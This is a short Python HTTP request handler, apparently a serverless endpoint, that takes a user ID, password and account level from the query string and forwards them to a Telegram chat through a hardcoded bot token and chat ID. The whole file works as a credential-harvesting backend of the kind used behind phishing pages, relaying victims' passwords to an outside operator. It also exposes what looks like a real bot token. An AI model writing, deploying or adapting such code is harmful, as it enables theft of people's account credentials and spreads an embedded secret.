from http.server import BaseHTTPRequestHandler
import requests
from urllib.parse import urlparse, parse_qs

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)

        uid = query.get("uid", [""])[0]
        password = query.get("password", [""])[0]
        level = query.get("level", [""])[0]

        BOT = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
        CHAT = "7326248826"

        text = f"{uid} | {password} | {level}"

        try:
            requests.get(
                f"https://api.telegram.org/bot{BOT}/sendMessage",
                params={"chat_id": CHAT, "text": text}
            )

            response = "OK"

        except Exception as e:
            response = str(e)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(response.encode())
